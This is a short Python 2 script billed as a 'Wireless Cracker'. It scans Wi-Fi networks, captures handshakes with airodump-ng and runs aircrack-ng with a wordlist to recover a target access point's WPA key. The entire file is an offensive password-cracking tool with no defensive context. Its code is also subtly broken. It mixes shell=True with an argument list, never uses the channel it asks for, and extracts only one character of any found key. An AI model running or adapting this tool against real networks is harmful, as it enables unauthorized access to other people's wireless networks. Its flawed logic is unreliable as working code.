import subprocess, time
command=['iwlist', 'wlan0', 'scan']
output=subprocess.Popen(command, stdout=subprocess.PIPE).stdout.readlines()
data=[]
wifiFile=open("wifiReport.txt", "w+")

for item in output:
   wifiFile.write(item)

print "Welcome to the Wireless Cracker."
print "Details about available wireless networks may be found in 'wifiReport.txt'"
ssid=raw_input("Please enter the SSID of the wireless network: ")
apmac=raw_input("Please enter the MAC Address of the wireless access point: ")
channel=raw_input("Please enter the channel for the wireless network: ")
interface=raw_input("Please enter the monitoring interface name: ")
passfile=raw_input("Please enter the file of possible keys: ")

airodumpcmd=['airodump-ng','-w psk',interface]
airodumpout=subprocess.Popen(airodumpcmd, shell=True)
time.sleep(10)
aircrackcmd=['aircrack-ng','-w'+passfile,'-b'+apmac,' psk*.cap']
aircrackout=subprocess.Popen(aircrackcmd, stdout=subprocess.PIPE).stdout.readlines()

for item in aircrackout:
   item=item.strip()
   keyPos=item.find("KEY FOUND:")
   if keyPos>0:
	key=item[keyPos]
   else:
	key="Key not found."
print ""+ssid+": "+key
